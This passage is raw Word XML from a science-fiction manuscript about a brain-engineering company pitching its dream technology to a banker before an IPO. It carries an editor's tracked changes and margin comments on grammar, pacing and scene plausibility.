          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Daniel couldn’t tell if the banker was relieved or disappointed. “Technology licensing,” he said without looking up. “I understand that’s your post-IPO revenue strategy,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right,” said Daniel. “We want to release these capabilities for third-party development. Other people will build upon what we’ve created here in ways that we haven’t yet imagined. Maybe they’ll run virtual vacation companies that send people on secret-agent missions to Mars. Or</w:t>
      </w:r>
      <w:ins w:id="3247" w:author="TextVet" w:date="2016-03-29T14:33:00Z">
        <w:r w:rsidR="00080513">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perhaps they’ll enter the dreams of billionaire heirs </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>to convince them to dissolve their fathers’ conglomerates. But</w:t>
      </w:r>
      <w:ins w:id="3248" w:author="TextVet" w:date="2016-03-29T14:33:00Z">
        <w:r w:rsidR="00080513">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for me</w:t>
      </w:r>
      <w:ins w:id="3249" w:author="TextVet" w:date="2016-03-29T14:34:00Z">
        <w:r w:rsidR="00B20B4E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3250" w:author="TextVet" w:date="2016-03-29T14:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B20B4E">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T</w:t>
      </w:r>
      <w:ins w:id="3251" w:author="TextVet" w:date="2016-03-29T14:34:00Z">
        <w:r w:rsidR="00B20B4E">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and the rest of us here, we figured we</w:t>
      </w:r>
      <w:ins w:id="3252" w:author="TextVet" w:date="2016-03-29T14:33:00Z">
        <w:r w:rsidR="00080513">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3253" w:author="TextVet" w:date="2016-03-29T14:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00080513">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> woul</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d use it for something </w:t>
      </w:r>
      <w:del w:id="3254" w:author="TextVet" w:date="2016-03-29T14:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00953D4B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">a bit </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>more</w:t>
      </w:r>
      <w:ins w:id="3255" w:author="TextVet" w:date="2016-03-29T14:33:00Z">
        <w:r w:rsidR="00953D4B">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therapeutic.”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“Then I have the same question about your technologies as I do about your finances,” Caldwell replied. “No other party can lay claim to your intellectual property? Contest your patents? Demand royalties?”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“Mr. Caldwell, I wouldn’t even be </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>able</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to enjoy any of this if it was the spoils of theft. What my friends and I have created here, we’ve created ourselves.”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Caldwell checked his tablet screen. “So you would be able to speak about the process by which all of this was developed, I presume?”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Daniel laughed warmly. “Most people can’t get me to </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>stop</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> speaking about it! You see, our technology is all based on one simple premise: that it’s possible to work with the brain as neurochemical machinery. Thinking, feeling, wanting, dreaming — they’re all </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>physical</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> processes. When you understand how the components work, it becomes possible to analyze thoughts flowing through a human mind the same way you analyze instructions flowing through a computer’s CPU. When a neurobiologist talks about what motivates a person, how a person perceives the world and acts on </w:t>
      </w:r>
      <w:del w:id="3256" w:author="TextVet" w:date="2016-03-29T14:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D36751">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">their </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>desires… When you speak about such matters armed with actual knowledge of how the brain operates, you’re not talking philosophy. You’re talking </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>engineering</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. We each have the power to </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>reprogram ourselves</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. This facility is simply a way to help people </w:t>
      </w:r>
      <w:ins w:id="3257" w:author="TextVet" w:date="2016-03-29T14:36:00Z">
        <w:r w:rsidR="00D31482">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>d</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3258" w:author="TextVet" w:date="2016-03-29T14:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D31482">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o that. A dev kit, if you will. The question is: What kind of apps will you write on the platform that is your brain? The answer to that</w:t>
      </w:r>
      <w:commentRangeStart w:id="3259"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:commentRangeEnd w:id="3259"/>
      <w:r w:rsidR="00B02A62">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="3259"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is entirely up to you.”</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Clients 7.1.1, 7.1.2, and 7.1.3</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> filled out the forms, strapped the caps and goggles over their heads, let the nurses attach tubes to their bodies, and settled into their recliners. They didn’t know exactly what awaited them, but the elevated heart rate readouts on their monitoring terminals conveyed their excitement. They were about to discover what it would be like to live out their heart’s desires. And, in the process, possibly even discover what those desires might be.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="AAAAAA"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="AAAAAA"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The End</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C824A8" w:rsidRDefault="00C824A8"/>
    <w:sectPr w:rsidR="00C824A8" w:rsidSect="001113C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2" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>‘were’, strictly speaking, but we should let it roll, given his mental state?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="218" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Nice—‘caressed’ might be appropriate, too, but ‘traced’ does it without the sugar.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="242" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>A conversational approach might be better for describing thoughts.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="260" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>The comma isn’t necessary, but it symbolizes the point that he doesn’t realize he’s being naïve.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="330" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>It’s an umbrella term, partly used here to show that he might not be au fait with the exact genre.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="335" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I had a sentence: “He could have been regarding his twin brother, bleeding with guilt for daring to dither over deciding his fate.”  But what you’ve got here says it succinctly.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="373" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Excellent! </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F04A"/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="375" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>“Both” if we want to show that Danny is meeting the two new guys, but “all” is fine if we want to pretend he’s meeting Jason, too, at least as far as the two new gamers are concerned.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="379" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>This strikes me as a little too fluid for reality.  How about a line to show the cabin’s response: “The three faces before him could have been cold Play-Doh, even Jason’s.” then “ ‘Now clear… ‘ ”?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="402" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>‘who’, but let’s keep it in character?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="403" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Chapter break?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="420" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Split infinitive, hence the quotation marks so as to put the blame on the spammers.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="473" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Split infinite but betrays character, so leave in?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="489" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Sub-chapter break?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="544" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Rhetorical question, so ‘asked’ is optional</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="607" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Split inf.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="610" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>‘its’ might be more natural, even if wrong?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="612" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Maybe natural is better?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="680" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I kept this in the conditional; I didn’t know if you wanted to expand on the notion that Danny’s reverie has become what he actually sees here.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="695" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Unsure of this term, but seems cool—I might use it as an American saying?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="730" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">I hope you don’t mind these constructions: conveying a warning less obvious than ‘threatened’ struck me as being apropos. </w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1065" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I’m not sure if it might be better to internalize this to Danny’s thoughts.  Its present state lends some levity here.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1088" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Should we worry about a reloading sequence?  Don’t worry, it’s not that obvious—I just think in realpolitik with the provisioning of things.  </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F04A"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
    </w:p>
  </w:comment>
  <w:comment w:id="1133" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I show cut-offs with an em dash, no spaces.  Please feel free to adjust, but that’s my grammar-ghoulishness at work!</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1192" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>A note about sound effects—</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:t>Two schools seem to exist about italics and quotation marks.  It might be too minor to flag up, but I just noticed this.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1217" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Cordite might be more apt.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1223" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>A split infy, here, but the effect is justifiable, I think</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1233" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Sometimes, I leave questions that are either rhetorical or challenging as ‘said’. </w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1288" w:author="TextVet" w:date="2016-03-18T14:35:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I hope you don’t mind my verbing—it’s more flowful than adverbs.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1522" w:author="TextVet" w:date="2016-03-18T15:55:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Ammo time—it might help to have her wondering (as most revolvers go to a max of eight in the cylinder, and his should take massive bullets): “Had she seen the brute whisk a speedloader into it in all that mayhem?” </w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1848" w:author="TextVet" w:date="2016-03-20T10:15:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">This is a section for the blurb! </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F04A"/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1849" w:author="TextVet" w:date="2016-03-20T10:18:00Z" w:initials="T">
    <w:p w:rsidR="00F86333" w:rsidRDefault="00F86333">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>These are subchapter breaks then.  I’ve leave making the space required to you.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="1860" w:author="TextVet" w:date="2016-03-20T10:25:00Z" w:initials="T">
